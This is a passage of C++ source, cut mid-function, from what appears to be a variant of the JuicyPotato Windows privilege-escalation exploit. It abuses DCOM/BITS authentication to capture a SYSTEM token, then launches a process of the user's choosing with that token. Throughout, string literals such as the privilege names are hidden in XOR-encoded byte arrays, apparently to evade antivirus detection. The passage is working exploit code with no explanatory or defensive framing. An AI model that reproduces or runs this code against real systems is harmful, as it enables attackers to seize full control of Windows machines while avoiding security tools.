for(char &x : hid________YUMV4x2kt9yh){
x = x ^ k_mxSs3bPapUZu;
}

	 char  hid_Wrong__2MGXNDY5tZLQ[] = {'\x12','\x37','\x2a','\x2b','\x22','\x65','\x4','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7f','\x65','\x60','\x36','\x4f','\x45'};
char k_GRfe3RHoYjym = '\x45';
for(char &x : hid_Wrong__2MGXNDY5tZLQ){
x = x ^ k_GRfe3RHoYjym;
}
BOOL brute = FALSE;

	strcpy(dcom_ip, hid________YUMV4x2kt9yh);
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			case 't':
				++argv;
				--argc;
				processtype = argv[1];
				break;

			case 'p':
				++argv;
				--argc;
				processname = argv[1];
				break;

			case 'l':
				++argv;
				--argc;
				g_port = argv[1];
				break;
			
			case 'c':
				++argv;
				--argc;
				olestr = argv[1];
				break;

			case 'a':
				++argv;
				--argc;
				processargs = argv[1];
				break;

			case 'm':
				++argv;
				--argc;
				memset(dcom_ip, 0, 17);
				wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
				break;

			case 'h':
				usage();
				exit(100);
				break;

			case 'k':
				++argv;
				--argc;
				rpcserver = argv[1];
				break;

			case 'n':
				++argv;
				--argc;
				rpcport = argv[1];
				break;

			case 'z':
				TEST_mode = TRUE;
				break;

			default:
				printf(hid_Wrong__2MGXNDY5tZLQ, argv[1]);
				usage();
				exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		usage();
		exit(-1);
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}

int Juicy(wchar_t *clsid, BOOL brute)
{
	
	 char  hid_Testin_fngdR005TqWf[] = {'\x11','\x20','\x36','\x31','\x2c','\x2b','\x22','\x65','\x60','\x16','\x65','\x60','\x16','\x4f','\x45'};
char k_DAzp7ntmQ1fS = '\x45';
for(char &x : hid_Testin_fngdR005TqWf){
x = x ^ k_DAzp7ntmQ1fS;
}

	 char  hid______a_iK6In2UmHc4e[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x24','\x30','\x31','\x2d','\x37','\x20','\x36','\x30','\x29','\x31','\x65','\x60','\x21','\x4f','\x45'};
char k_R6xkzTFUmKxH = '\x45';
for(char &x : hid______a_iK6In2UmHc4e){
x = x ^ k_R6xkzTFUmKxH;
}

	 wchar_t  hid_S_e_I__NUNM0FudrWPR[] = {'\x16','\x45','\x20','\x45','\xc','\x45','\x28','\x45','\x35','\x45','\x20','\x45','\x37','\x45','\x36','\x45','\x2a','\x45','\x2b','\x45','\x24','\x45','\x31','\x45','\x20','\x45','\x15','\x45','\x37','\x45','\x2c','\x45','\x33','\x45','\x2c','\x45','\x29','\x45','\x20','\x45','\x22','\x45','\x20','\x45','\x45'};
char k_iwGFauLUW5Rq = '\x45';
for(char &x : hid_S_e_I__NUNM0FudrWPR){
x = x ^ k_iwGFauLUW5Rq;
}

	 wchar_t  hid_S_e_A__Jn5bQqteWBTJ[] = {'\x16','\x45','\x20','\x45','\x4','\x45','\x36','\x45','\x36','\x45','\x2c','\x45','\x22','\x45','\x2b','\x45','\x15','\x45','\x37','\x45','\x2c','\x45','\x28','\x45','\x24','\x45','\x37','\x45','\x3c','\x45','\x11','\x45','\x2a','\x45','\x2e','\x45','\x20','\x45','\x2b','\x45','\x15','\x45','\x37','\x45','\x2c','\x45','\x33','\x45','\x2c','\x45','\x29','\x45','\x20','\x45','\x22','\x45','\x20','\x45','\x45'};
char k_9fQer08I5ycX = '\x45';
for(char &x : hid_S_e_A__Jn5bQqteWBTJ){
x = x ^ k_9fQer08I5ycX;
}

	 char  hid_____Er_Rp5Wj8M8wqLb[] = {'\x1e','\x68','\x18','\x65','\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
char k_N1lc09brXqiN = '\x45';
for(char &x : hid_____Er_Rp5Wj8M8wqLb){
x = x ^ k_N1lc09brXqiN;
}

	 char  hid_Error__U9iucL6Kdtiq[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
char k_g0p1W5Rf2OfO = '\x45';
for(char &x : hid_Error__U9iucL6Kdtiq){
x = x ^ k_g0p1W5Rf2OfO;
}

	 char  hid______C_iNBCAA3611tN[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_CDvmrNiWevhs = '\x45';
for(char &x : hid______C_iNBCAA3611tN){
x = x ^ k_CDvmrNiWevhs;
}

	 char  hid______C_GWahrEOeZoo3[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\xa','\xe','\x4f','\x45'};
char k_pUPOqaw82Eyh = '\x45';
for(char &x : hid______C_GWahrEOeZoo3){
x = x ^ k_pUPOqaw82Eyh;
}

	 wchar_t  hid_C______IW6bzlbjgPnv[] = {'\x6','\x45','\x7f','\x45','\x19','\x45','\x45'};
char k_Vc7HNLSnm8gM = '\x45';
for(char &x : hid_C______IW6bzlbjgPnv){
x = x ^ k_Vc7HNLSnm8gM;
}

	 char  hid______C_h206o4Xh7jeQ[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_TvgsiU2b2faB = '\x45';
for(char &x : hid______C_h206o4Xh7jeQ){
x = x ^ k_TvgsiU2b2faB;
}

	 char  hid______C_CeKdmUX42TIt[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\xa','\xe','\x4f','\x45'};
char k_TyAzNhr73Y5W = '\x45';
for(char &x : hid______C_CeKdmUX42TIt){
x = x ^ k_TyAzNhr73Y5W;
}

	 char  hid_Waitin_zA80QY28QQHd[] = {'\x12','\x24','\x2c','\x31','\x2c','\x2b','\x22','\x65','\x23','\x2a','\x37','\x65','\x24','\x30','\x31','\x2d','\x6b','\x6b','\x6b','\x45'};
char k_lUoXWSsxn4Zd = '\x45';
for(char &x : hid_Waitin_zA80QY28QQHd){
x = x ^ k_lUoXWSsxn4Zd;
}
PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode)
		printf(hid_Testin_fngdR005TqWf, olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	BOOL result = false;

	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode)
				printf(hid______a_iK6In2UmHc4e, test->negotiator->authResult);

			fflush(stdout);

			// Get a token for this process. 
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;

			//enable privileges
			EnablePriv(hToken, hid_S_e_I__NUNM0FudrWPR);
			EnablePriv(hToken, hid_S_e_A__Jn5bQqteWBTJ);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
			IsTokenSystem(elevated_token);
			if (TEST_mode)
				return 1;

			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_____Er_Rp5Wj8M8wqLb, GetLastError());

			result = DuplicateTokenEx(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_Error__U9iucL6Kdtiq, GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessWithTokenW(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf(hid______C_iNBCAA3611tN, GetLastError());
				}
				else
				{
					printf(hid______C_GWahrEOeZoo3);
					break;
				}
			} 

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessAsUserW(
					duped_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					hid_C______IW6bzlbjgPnv, &si, &pi
				);

				if (!result) {
					printf(hid______C_h206o4Xh7jeQ, GetLastError());
				}
				else {
					printf(hid______C_CeKdmUX42TIt);
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf(hid_Waitin_zA80QY28QQHd);
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
	}
	return result;
}
